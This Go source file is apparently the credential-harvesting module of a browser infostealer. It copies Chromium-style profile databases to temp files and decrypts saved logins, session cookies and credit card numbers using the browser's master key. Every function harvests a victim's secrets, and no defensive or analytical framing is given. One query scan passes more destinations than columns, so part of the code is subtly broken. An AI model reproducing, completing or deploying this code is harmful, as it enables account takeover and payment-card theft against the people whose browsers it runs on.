package main

import (
	"database/sql"
	"os"
)

type Login struct {
	OriginURL string `json:"origin_url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
}

type Cookie struct {
	Domain     string `json:"domain"`
	Name       string `json:"name"`
	Path       string `json:"path"`
	Value      string `json:"value"`
	ExpressUTC string `json:"expires_utc"`
}

type CreditCard struct {
	NameOnCard   string `json:"name_on_card"`
	CardNumber   string `json:"card_number"`
	ExpMonth     string `json:"exp_month"`
	ExpYear      string `json:"exp_year"`
	DateModified string `json:"date_modified"`
}

type AutoFill struct {
	Name         string `json:"name"`
	Value        string `json:"value"`
	DateCreated  string `json:"date_created"`
	DateLastUsed string `json:"date_last_used"`
	Count        string `json:"count"`
}

func DecryptAutoFillData(profiles []string) []AutoFill {
	var autoFillArray []AutoFill

	for _, profile := range profiles {
		autoFillPath := profile + "\\Web Data"
		autoFill := CreateTempFile("Web Data Temp")
		CopyFile(autoFillPath, autoFill)

		db, _ := sql.Open("sqlite3", autoFill.Name())
		defer func(db *sql.DB) {
			_ = db.Close()
		}(db)

		rows, _ := db.Query("SELECT name, value, date_created, date_last_used, count FROM autofill")
		defer func(rows *sql.Rows) {
			_ = rows.Close()
		}(rows)

		for rows.Next() {
			var name string
			var value string
			var dateCreated string
			var dateLastUsed string
			var count string

			_ = rows.Scan(&name, &value, &dateCreated, &dateLastUsed, &count)

			autoFillArray = append(autoFillArray, AutoFill{
				Name:         name,
				Value:        value,
				DateCreated:  dateCreated,
				DateLastUsed: dateLastUsed,
				Count:        count,
			})
		}

		CloseFile(autoFill)
		_ = os.Remove(autoFill.Name())
	}

	return autoFillArray
}

func DecryptCreditCardsData(profiles []string, localState string) []CreditCard {
	var creditCardsDataArray []CreditCard

	for _, profile := range profiles {
		creditCardsDataPath := profile + "\\Web Data"
		creditCardsData := CreateTempFile("Web Data Temp")
		CopyFile(creditCardsDataPath, creditCardsData)

		db, _ := sql.Open("sqlite3", creditCardsData.Name())
		defer func(db *sql.DB) {
			_ = db.Close()
		}(db)

		rows, _ := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards")
		defer func(rows *sql.Rows) {
			_ = rows.Close()
		}(rows)

		for rows.Next() {
			var nameOnCard string
			var expirationMonth string
			var expirationYear string
			var encryptedCardNumber []byte
			var dateModified string
			var decryptedCardNumber string

			_ = rows.Scan(&nameOnCard, &expirationMonth, &expirationYear, &encryptedCardNumber, &dateModified, &decryptedCardNumber)

			key, _ := GetMasterKey(localState)
			cardNumber := DecryptPassword(encryptedCardNumber, key)

			creditCardsDataArray = append(creditCardsDataArray, CreditCard{
				NameOnCard:   nameOnCard,
				CardNumber:   cardNumber,
				ExpMonth:     expirationMonth,
				ExpYear:      expirationYear,
				DateModified: dateModified,
			})
		}

		CloseFile(creditCardsData)
		_ = os.Remove(creditCardsData.Name())
	}

	return creditCardsDataArray
}

func DecryptCookieData(profiles []string, localState string) []Cookie {
	var cookieDataArray []Cookie

	for _, profile := range profiles {
		cookieDataPath := profile + "\\Network\\Cookies"
		cookieData := CreateTempFile("Cookies Temp")
		CopyFile(cookieDataPath, cookieData)

		db, _ := sql.Open("sqlite3", cookieData.Name())
		defer func(db *sql.DB) {
			_ = db.Close()
		}(db)

		rows, _ := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
		defer func(rows *sql.Rows) {
			_ = rows.Close()
		}(rows)

		for rows.Next() {
			var hostKey string
			var name string
			var pathCookie string
			var encryptedCookieValue []byte
			var expiresUtc string

			_ = rows.Scan(&hostKey, &name, &pathCookie, &encryptedCookieValue, &expiresUtc)

			key, _ := GetMasterKey(localState)
			cookie := DecryptPassword(encryptedCookieValue, key)

			cookieDataArray = append(cookieDataArray, Cookie{
				Domain:     hostKey,
				Name:       name,
				Path:       pathCookie,
				Value:      cookie,
				ExpressUTC: expiresUtc,
			})
		}

		CloseFile(cookieData)
		_ = os.Remove(cookieData.Name())
	}

	return cookieDataArray
}

func DecryptLoginData(profiles []string, localState string) []Login {
	var loginDataArray []Login

	for _, profile := range profiles {
		loginDataPath := profile + "\\Login data"
		loginData := CreateTempFile("Login Data Temp")
		CopyFile(loginDataPath, loginData)

		db, _ := sql.Open("sqlite3", loginData.Name())
		defer func(db *sql.DB) {
			_ = db.Close()
		}(db)

		rows, _ := db.Query("select origin_url, username_value, password_value from logins")
		defer func(rows *sql.Rows) {
			_ = rows.Close()
		}(rows)

		for rows.Next() {
			var originUrl string
			var usernameValue string
			var encryptedPasswordValue []byte

			_ = rows.Scan(&originUrl, &usernameValue, &encryptedPasswordValue)

			key, _ := GetMasterKey(localState)
			password := DecryptPassword(encryptedPasswordValue, key)

			loginDataArray = append(loginDataArray, Login{
				OriginURL: originUrl,
				Username:  usernameValue,
				Password:  password,
			})
		}

		CloseFile(loginData)
		_ = os.Remove(loginData.Name())
	}

	return loginDataArray
}
